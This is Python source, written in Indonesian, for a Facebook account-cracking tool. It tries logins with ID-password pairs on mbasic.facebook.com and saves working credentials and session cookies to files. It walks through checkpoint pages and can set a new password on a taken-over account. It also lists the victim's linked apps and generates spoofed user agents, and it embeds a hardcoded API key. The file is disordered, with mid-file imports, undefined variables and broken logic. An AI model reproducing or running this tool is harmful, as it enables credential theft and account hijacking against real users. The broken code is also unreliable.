					statusok = f'[•] ID       : {idf}\n[•] PASSWORD : {pw}\n[•] COOKIES  : {kuki}'
					statusok1 = nel(statusok, width=80, style='bold green', title='OK')
					cetak(statusok1)
					os.popen('play-audio o.mp3')
					open('OK/'+okc,'a').write(idf+'|'+pw+'|'+ua+'\n')
					cek_apk(kuki)
					break
				
			else:
				continue
		except requests.exceptions.ConnectionError:
			time.sleep(31)
	loop+=1
#-----------------------[ CEK APLIKASI ]--------------------#
def cek_apk(kuki):
	session = requests.Session()
	w=session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=active",cookies={"cookie":"noscript=1;"+kuki}).text
	sop = bs4.BeautifulSoup(w,"html.parser")
	x = sop.find("form",method="post")
	game = [i.text for i in x.find_all("h3")]
	try:
		for i in range(len(game)):
			print ("\r%s  \033[0m              ➛ %s%s"%(P,H,game[i].replace("Ditambahkan pada"," Ditambahkan pada")))
	except AttributeError:
		print ("\r    %s\033[0m cookie invalid"%(M))
	w=session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=inactive",cookies={"cookie":"noscript=1;"+kuki}).text
	sop = bs4.BeautifulSoup(w,"html.parser")
	x = sop.find("form",method="post")
	game = [i.text for i in x.find_all("h3")]
	try:
		for i in range(len(game)):
			print ("\r%s  \033[0m              ➛ %s"%(P,game[i].replace("Kedaluwarsa"," Kedaluwarsa")))
	except AttributeError:
		print ("\r    %s \033[0mcookie invalid"%(M))

def ceker(idf,pw):
	sess=requests.Session()
	data={}
	uua="Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Mobile Safari/537.36"
	sess.headers.update({"User-Agent":uua,"Host":"m.facebook.com","accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9","accept-encoding":"gzip, deflate","accept-language":"id-ID,id;q=0.9","referer":"https://mbasic.facebook.com/","user-agent":"ua"})
	soup=parser(sess.get("https://m.facebook.com/login/?next&ref=dbl&fl&refid=8").text,"html.parser")
	link=soup.find("form",{"method":"post"})
	for x in soup("input"):data.update({x.get("name"):x.get("value")})
	data.update({"email":idf,"pass":pw})
	response=parser(sess.post("https://m.facebook.com"+link.get("action"),data=data).text,"html.parser")
	try:
		link2=response.find("form",{"method":"post"});listInput=['fb_dtsg','jazoest','checkpoint_data','submit[Continue]','nh']
		for x in response("input"):
			if x.get("name") in listInput:data2.update({x.get("name"):x.get("value")}) 
		responses=parser(sess.post("https://m.facebook.com"+link2.get("action"),data=data2).text,"html.parser")
		cek=[cek.text for cek in responses.find_all("option")]
		if len(cek)==0:pass
		else:
			for opsi in range(len(cek)):opsi.append(print("[bold white]"+cek[opsi]))
	except:pass
	if len(opsi)==0:pass
	print (' [+] Columns(opsi)')
                              
#-----------------------[ DEF CEK OPSI ]--------------------#
import requests, shutil, os, re, bs4, sys, json, time, platform ,random, datetime, subprocess, logging, base64
import hmac, hashlib, urllib, stdiomask, urllib.request, uuid
from concurrent.futures import ThreadPoolExecutor
from bs4 import BeautifulSoup as parser
from threading import (Thread, Event)
from time import sleep as jeda
from datetime import datetime

ct = datetime.now()
n = ct.month
bulan_ = ['Januari', 'Februari', 'Maret', 'April', 'Mei', 'Juni', 'Juli', 'Agustus', 'September', 'Oktober', 'November', 'Desember']
try:
	if n < 0 or n > 12:
		exit()
	nTemp = n - 1
except ValueError:
	exit()

current = datetime.now()
hari = current.day
bulan = bulan_[nTemp]
tahun = current.year
bullan = current.month
day = datetime.now().strftime("%d-%b-%Y")

M = '\x1b[1;91m' # MERAH
H = '\x1b[1;92m' # HIJAU
K = '\x1b[1;93m' # KUNING
B = '\x1b[1;94m' # BIRU
U = '\x1b[1;95m' # UNGU
O = '\x1b[1;96m' # BIRU MUDA
P = '\x1b[1;97m' # PUTIH
J = '\033[38;2;255;127;0;1m' # ORANGE
N = '\x1b[0m' # WARNA MATI
acak = [P]
warna = random.choice(acak)
til ="\033[0m [+] "

def jalan(keliling):
	for mau in keliling + '\n':
		sys.stdout.write(mau)
		sys.stdout.flush();jeda(0.03)
		
		
ubah_pass = []
pwbaru = []
pwBaru = []
ubahP = []

def file_cp():
	dirs = os.listdir('CP')
	for file in dirs:
		Console().print(Panel(f"{(file)}",width=80, style="{bold cyan}"))
	try:
		Console().print(Panel(f"Copy Nama File Di Atas Kemudian Tempel Di Bawah Ini Contoh : {day}.txt",width=80,style="{color_panel}"))
		opsi()
	except IOError:
		Console().print(Panel(f"Tidak Ada File Untuk Di Cek Silahkan Crack Dulu",width=80,style="{color_panel}"))
		exit()

def opsi():
	CP = ("CP/")
	romi = console.input(f" {H2}• {P2}Masukan : ")
	if romi == "":
		console.print(f" {H2}• {P2}Isi Yang Bener! ")
		opsi()
	try:
		file_cp = open(CP+romi, "r").readlines()
	except IOError:
		exit(Console().print(Panel(f"""[bold cyan]   ╰─>[bold red] Nama File {(romi)} Tidak Di Temukan""",width=80,style=f"bold white")))
	prints(Panel(f"""[bold white]Sebelum Melanjutkan Hidupkan/Matikan Mode Pesawat""",width=80,style=f"bold cyan"))
	Console(width=80, style="bold cyan").print(Panel("[bold white] Ubah Password ? Y/T ",subtitle="╭───", subtitle_align="left"))
	pw= Console().input(f"[bold cyan]   ╰─> ")
	if pw in['y','Y']:
		ubah_pass.append("ubah_sandi")
		Console(width=80, style="bold cyan").print(panel("[bold white] Masukan Password Baru",subtitle="╭───", subtitle_align="left"))
		pw2=Console().input(f"[bold cyan]   ╰─> ")
		if len(pw2) <= 5:
			Console().print(Panel(f"""[bold white]Sandi Minimal 6 Karakter""",width=80,style=f"bold cyan"))
		else:
			pwbaru.append(pw2)
	prints(Panel(f"""[bold white]Total akun : [bold green]{str(len(file_cp))}""",width=80,style=f"bold cyan"))
	nomor = 0
	for fb in file_cp:
		akun = fb.replace("\n","")
		ngecek  = akun.split("|")
		nomor+=1
		Console().print(Panel(f"""[bold white][{(str(nomor))}] Cek Sesi Akun = {akun}""",width=80,style=f"bold cyan"));jeda(0.10)
		try:
			mengecek(ngecek[0].replace("",""), ngecek[1])
		except requests.exceptions.ConnectionError:
			continue

data = {}
data2 = {}

def mengecek(user,pw):
	global loop,ubah_pass,pwbaru
	session=requests.Session()
	ua = 'Mozilla/5.0 (Linux; Android 8.1.0; S45B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Mobile Safari/537.36'
	url = "https://mbasic.facebook.com"
	session.headers.update({"Host": "mbasic.facebook.com","cache-control": "max-age=0","upgrade-insecure-requests": "1","origin": "https://mbasic.facebook.com","content-type": "application/x-www-form-urlencoded","user-agent": ua,"accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9","x-requested-with": "mark.via.gp","sec-fetch-site": "same-origin","sec-fetch-mode": "navigate","sec-fetch-user": "?1","sec-fetch-dest": "document","referer": "https://mbasic.facebook.com/login/?next&ref=dbl&fl&refid=8","accept-encoding": "gzip, deflate","accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"})
	soup=bs4.BeautifulSoup(session.get(url+"/login/?next&ref=dbl&fl&refid=8").text,"html.parser")
	link=soup.find("form",{"method":"post"})
	for x in soup("input"):
		data.update({x.get("name"):x.get("value")})
	data.update({"email":user,"pass":pw})
	urlPost=session.post(url+link.get("action"),data=data)
	response=bs4.BeautifulSoup(urlPost.text, "html.parser")
	if "c_user" in session.cookies.get_dict():
		if "Akun Anda Dikunci" in urlPost.text:
			print("\r%s%s\033[0m akun terkunci sesi new"%(M,til))
		else:
			print("\r%s%s\033[0m akun tidak checkpoint, silahkan anda login "%(til,H))
			open('OK/OK-%s.txt'%(day), 'a').write(" %s|%s\n" % (user,pw))
	elif "checkpoint" in session.cookies.get_dict():
		coki = (";").join([ "%s=%s" % (key, value) for key, value in session.cookies.get_dict().items() ])
		title=re.findall("\<title>(.*?)<\/title>",str(response))
		link2=response.find("form",{"method":"post"})
		listInput=['fb_dtsg','jazoest','checkpoint_data','submit[Continue]','nh']
		for x in response("input"):
			if x.get("name") in listInput:
				data2.update({x.get("name"):x.get("value")})
		an=session.post(url+link2.get("action"),data=data2)
		response2=bs4.BeautifulSoup(an.text,"html.parser")
		cek=[cek.text for cek in response2.find_all("option")]
		number=0
		print("\r%s%s \033[0m [+] Terdapat %s%s%s \033[0mOpsi %s:"%(U,O,P,str(len(cek)),O,M));jeda(0.07)
		if(len(cek)==0):
			if "Lihat detail login yang ditampilkan. Ini Anda?" in title:
				if "ubah_sandi" in ubah_pass:
					dat,dat2={},{}
					but=["submit[Yes]","nh","fb_dtsg","jazoest","checkpoint_data"]
					for x in response("input"):
						if x.get("name") in but:
							dat.update({x.get("name"):x.get("value")})
					ubahPw=session.post(url+link2.get("action"),data=dat).text
					resUbah=bs4.BeautifulSoup(ubahPw,"html.parser")
					link3=resUbah.find("form",{"method":"post"})
					but2=["submit[Next]","nh","fb_dtsg","jazoest"]
					if "Buat Kata Sandi Baru" in re.findall("\<title>(.*?)<\/title>",str(ubahPw)):
						for b in resUbah("input"):
							dat2.update({b.get("name"):b.get("value")})
						dat2.update({"password_new":"".join(pwbaru)})
						an=session.post(url+link3.get("action"),data=dat2)
						coki = (";").join([ "%s=%s" % (key, value) for key, value in session.cookies.get_dict().items() ])
						print("\r%s%s\033[0makun one tab, sandi berhasil di ubah \n OK %s%s%s|%s|%s			"%(H,til,N,H,user,pwbaru[0],coki))
						open('OK/OK-%s.txt' %(day), 'a').write("%s%s|%s|%s\n" % (H,user,pwbaru[0],coki))
				else:
					print("\r%s%s \033[0m\x1b[1;92mCheckpoint Terbuka, Akun Tap Yes Silahkan Login		"%(H,til))
					tree = Tree(" ",guide_style=f"{color_ok}")
					tree.add(Panel(f"{ua}",width=83,padding=(0,2),style=f"{color_ok}"))
					prints(tree)
					open('OK/OK-%s.txt' %(day), 'a').write("%s %s|%s|%s\n" % (H,user,pw,coki))
			elif "Masukkan Kode Masuk untuk Melanjutkan" in re.findall("\<title>(.*?)<\/title>",str(response)):
				print(Panel("\r%s\033[0m akun terpasang autentikasi dua faktor			"%(M)))
			else:
				print("%s%s\033[0mterjadi kesalahan"%(M,til))
		else:
			if "c_user" in session.cookies.get_dict():
				print("\r%s%s akun tidak checkpoint, silahkan anda login "%(H))
				open('OK/OK-%s.txt' %(day), 'a').write("%s%s|%s\n" % (H,user,pw))
		for opsi in range(len(cek)):
			number +=1
			jalan ("  %s%s. %s%s"%(P,str(number),K,cek[opsi]))
	elif "login_error" in str(response):
		oh = run.find("div",{"id":"login_error"}).find("div").text
		print("%s %s"%(M,oh))
	else:
		tree = Tree(" ",guide_style=f"bold white")
		tree.add(Panel(f"login gagal, silahkan cek kembali id dan kata sandi",width=83,padding=(0,2),style=f"bold white"))
		prints(tree)
def scarpping_ua():
    
    
    uascrap = []
    url = "https://api.apilayer.com/user_agent/generate?android=true&chrome=true"
    header = {"apikey": "2ZxXnjQByF6rPu3GM5DtcEmrJfKqB5xL"}
    
    
    
 
    try:
        response = requests.get(url,headers=header)
        if response.status_code == 200:
            uascrap.append(response.json()['ua'])
        else:
            uascrap.append("Mozilla/5.0 (Linux; Android 5.0; SAMSUNG SM-G900F Build/LRX21T) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/2.1 Chrome/34.0.1847.76 Mobile Safari/537.36")
    except requests.exceptions.ConnectionError:
        uascrap.append("Mozilla/5.0 (Linux; Android 5.0; SAMSUNG SM-G900F Build/LRX21T) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/2.1 Chrome/34.0.1847.76 Mobile Safari/537.36")
		  
#-----------------------[ DEFF SCRAPT METODE ]--------------------#
from bs4 import BeautifulSoup as bs
from datetime import datetime
from itertools import count 
from requests import get 
from bs4 import BeautifulSoup 
from rich import print as cetak
from rich import print as prints
from rich.panel import Panel as nel
done = False 
results = [] 
def back():
  login()
def clear():
    if "linux" in sys.platform.lower():os.system("clear")
    elif "win" in sys.platform.lower():os.system("cls")

def start():
    global Mulai_Jalan
    Mulai_Jalan = datetime.now()
def akhir():
    global Akhir_Jalan, Total_Waktu
    Akhir_Jalan = datetime.now()
    Total_Waktu = Akhir_Jalan - Mulai_Jalan
    try:
        Menit = str(Total_Waktu).split(':')[1]
        Detik = str(Total_Waktu).split(':')[2].replace('.',',').split(',')[0] + ',' + str(Total_Waktu).split(':')[2].replace('.',',').split(',')[1][:1]
        print('\n [+] Program Selesai Dalam Waktu %s Menit %s Detik\n'%(Menit,Detik))
    except Exception as e:
        print('\n\n [+] Program Selesai Dalam Waktu 0 Detik\n')
        
class Lain:
    	
	###----------[ FUNCTION INIT ]---------- ###
	def __init__(self,cookie):
		self.cookie = cookie
		self.file = []
		self.listfile = []
		
	###----------[ MENU ]---------- ###
	def menu(self):
		prints(Panel(f"""{P2}[{color_text}01{P2}]. lihat akun hasil crack  [{color_text}04{P2}]. ganti warna tema tools
[{color_text}02{P2}]. get info akun target    [{color_text}05{P2}]. tampilkan info cookies
[{color_text}03{P2}]. setting user agent      [{color_text}06{P2}]. logout ({M2}hapus login{P2})""",width=80,padding=(0,7),style=f"{color_panel}"))
		menu = console.input(f" {H2}• {P2}pilih menu : ")
		if menu in["01","1"]:
			self.cek_hasil()
		elif menu in["04","4"]:
			self.ganti_tema()
		elif menu in["05","5"]:
			self.tampil_cookie()
		elif menu in["06","6"]:
			os.system("rm data/cookie")
			exit(prints(Panel(f"""{H2}berhasil menghapus cookie, silahkan ketik ulang python run.py""",width=80,style=f"{color_panel}")))
		else:
			exit(prints(Panel(f"""{M2}🙏 maaf fitur ini belum tersedia, silahkan menunggu update selanjutnya""",width=80,style=f"{color_panel}")))

	###----------[ CEK HASIL CRACK ]---------- ###
	def cek_hasil(self):
		prints(Panel(f"""{P2}[{color_text}01{P2}]. lihat akun hasil crack ok
[{color_text}02{P2}]. lihat akun hasil crack cp""",width=80,padding=(0,20),style=f"{color_panel}"))
		ask = console.input(f" {H2}• {P2}masukan pilihan : ")
		if ask in["1","01"]:folder = "OK"
		else:folder = "CP"
		
		###----------[ PILIH FILE ]---------- ###
		dirs = os.listdir(folder)
		prints(Panel(f"""{P2} berhasil menemukan {len(dirs)} file hasil crack ok""",width=80,padding=(0,15),style=f"{color_panel}"))
		num = 0
		for fil in dirs:
			num += 1
			self.file.append(fil)
			totalakun = open(f"{folder}/{fil}","r").read().splitlines()
			self.listfile.append(Panel(f"{P2}[{color_text}0{num}{P2}]",width=10,title=f"{P2}nomer",style=f"{color_panel}"))
			self.listfile.append(Panel(f"{P2}{fil}",width=35,title=f"{P2}tanggal",style=f"{color_panel}"))
			self.listfile.append(Panel(f"{P2}{len(totalakun)} akun",width=28,title=f"{P2}total akun",style=f"{color_panel}"))
		console.print(Columns(self.listfile))
		prints(Panel(f"""{P2}kamu hanya perlu memilih dan memasukan nomer dari file crack di atas""",width=80,style=f"{color_panel}"))
		result = console.input(f" {H2}• {P2}masukan angka : ")
		
		###----------[ MULAI CEK ]---------- ###
		try:
			files = self.file[int(result)-1]
			totalhasil = open(f"{folder}/{files}","r").read().splitlines()
		except:
			prints(Panel(f"""{M2}file yang anda masukan tidak tersedia atau input kamu tidak benar""",width=80,style=f"{color_panel}"))
			exit()
		nama_file = (f"{files}").replace("-", " ").replace(".txt", "")
		prints(Panel(f"""{P2}nama file hasil crack : {nama_file} dan terdapat total akun : {len(totalhasil)}""",width=80,style=f"{color_panel}"))
		for akun in totalhasil:
			user = akun.split("|")[0]
			pw = akun.split("|")[1]
			tree = Tree(" ",guide_style=f"{color_panel}")
			if folder=="OK":
				cookie = akun.split("|")[2]
				tree.add(f"\r{H2}{user}|{pw}{P2} ")
				tree.add(Panel(f"{H2}{cookie}{P2}",style=f"{color_panel}"))
			else:
				tree.add(f"\r{K2}{user}|{pw}{P2} ")
			prints(tree)
		prints(Panel(f"""{P2} berhasil mengecek dan mendapatkan total {len(totalhasil)} akun dari file""",width=80,padding=(0,7),style=f"{color_panel}"))
		exit()
		
	###----------[ GANTI WARNA TEMA ]---------- ###
	def ganti_tema(self):
		prints(Panel(f"""{P2}[{color_text}01{P2}]. ganti warna tema merah  [{color_text}06{P2}]. ganti warna tema pink
[{color_text}02{P2}]. ganti warna tema hijau  [{color_text}07{P2}]. ganti warna tema cyan
[{color_text}03{P2}]. ganti warna tema kuning [{color_text}08{P2}]. ganti warna tema putih
[{color_text}04{P2}]. ganti warna tema biru   [{color_text}09{P2}]. ganti warna tema orange
[{color_text}05{P2}]. ganti warna tema ungu   [{color_text}10{P2}]. ganti warna tema abu2""",width=80,padding=(0,7),style=f"{color_panel}"))
		ask = console.input(f" {H2}• {P2}pilih tema : ")
		if ask in["01","1"]:warna = "[#FF0000]";teks="merah"
		elif ask in["02","2"]:warna = "[#00FF00]";teks="hijau"
		elif ask in["03","3"]:warna = "[#FFFF00]";teks="kuning"
		elif ask in["04","4"]:warna = "[#00C8FF]";teks="biru"
		elif ask in["05","5"]:warna = "[#AF00FF]";teks="ungu"
		elif ask in["06","6"]:warna = "[#FF00FF]";teks="pink"
		elif ask in["07","7"]:warna = "[#00FFFF]";teks="cyan"
		elif ask in["08","8"]:warna = "[#FFFFFF]";teks="putih"
		elif ask in["09","9"]:warna = "[#FF8F00]";teks="orange"
		elif ask in["10"]:warna = "[#AAAAAA]";teks="abu-abu"
		open("data/theme_color","w").write(warna+"|"+warna.replace("[","").replace("]",""))
		prints(Panel(f"""{H2}berhasil mengganti tema ke {teks}, silahkan mulai ulang tools""",width=80,padding=(0,6),style=f"{color_panel}"))
		sys.exit()

			
	###----------[ TAMPILKAN COOKIE ]---------- ###
	def tampil_cookie(self):
		now = datetime.now()
		hari = now.day+int(30)
		if hari > 30:hari = hari-30
		bulan = now.month+1
		if bulan > 12:bulan = bulan-12
		if now.month+1 > 12:tahun = now.year+1
		data = date(year=tahun,month=bulan,day=hari)
		aktif = data.strftime("%d %B %Y")
		console.print(f" {H2}• {P2}aktif sampai : {aktif}")
		prints(Panel(f"""{H2}{self.cookie.get('cookie')}""",width=80,style=f"{color_panel}"))
		sys.exit()
		
###----------[ BAGIAN SESSION HEADERS DAN USER AGENT ]---------- ###
class Session:
    
	
	###----------[ GENERATE USER AGENT CRACK ]---------- ###
	def generate_ugent(self):
		versi_android = random.randint(8,13)
		versi_chrome = str(random.randint(300,325))+".0.0."+str(random.randint(1,8))+"."+str(random.randint(40,150))
		versi_app = random.randint(410000000,499999999)
		device = random.choice(["VOG-L29 Build/HUAWEIVOG-L29","STK-LX3 Build/HUAWEISTK-LX3","BTV-W09 Build/HUAWEIBEETHOVEN-W09","CLT-AL00 Build/HUAWEICLT-AL00","LYA-AL10 Build/HUAWEILYA-AL10","ELE-L29 Build/HUAWEIELE-L29","DIG-AL00 Build/HUAWEIDIG-AL00","EVA-L09 Build/HUAWEIEVA-L09"])
		density = random.choice(["{density=3.0,width=1080,height=1920}","{density=2.0,width=720,height=1412}","{density=1.5, width=480, height=800}"])
		#ugent = f"Davik/2.1.0 (Linux; U; Android {versi_android}; {device} Build/{device}) [FBAN/MessengerLite;FBAV/{versi_chrome};FBPN/com.facebook.mlite;FBLC/{language};FBBV/{versi_app};FBCR/{simcard};FBMF/{merk_device};FBBD/{brand_device};FBDV/{model_device};FBSV/{android_version};FBCA/{cpu_device};FBDM/"+str(large_device)+";]"
		#return ugent		
#-----------------------[ SYSTEM-CONTROL ]--------------------#
if __name__=='__main__':
	try:os.system('git pull')
	except:pass
	try:os.mkdir('/sdcard/RUDAL-DUMP')
	except:pass
	try:os.mkdir('OK')
	except:pass
	try:os.mkdir('CP')
	except:pass
	try:os.mkdir('data')
	except:pass
	try:os.system('touch .prox.txt')
	except:pass
	try:os.system('clear')
	except:pass
	login()
